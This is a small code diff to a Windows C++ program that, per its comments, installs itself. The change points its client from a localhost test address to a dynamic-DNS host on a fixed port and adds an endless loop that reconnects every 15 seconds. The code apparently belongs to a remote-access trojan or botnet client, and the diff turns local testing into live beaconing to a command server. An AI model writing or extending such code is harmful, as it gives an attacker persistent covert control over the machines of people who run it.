@@ -27,18 +27,20 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdL
 	if (General::init())	//runs init() and exits file if it installs itself (starts new file)
 		return 0;
 
-	Client MyClient("127.0.0.1", 1111);
-
-	if (!MyClient.Connect())
-	{
-		testMB("failed to connect");
-		return 1;
-	}
+	Client MyClient("nehcer.ddns.net", 38632);
 
 	while (true)
 	{
-		Sleep(50);
+		if (!MyClient.connected)
+		{
+			while (!MyClient.Connect())
+			{
+				Sleep(15000);
+			}
+		}
+		Sleep(15000);
 	}
+
 	//test stuff (WORKS \o/)
 
 	return 0;
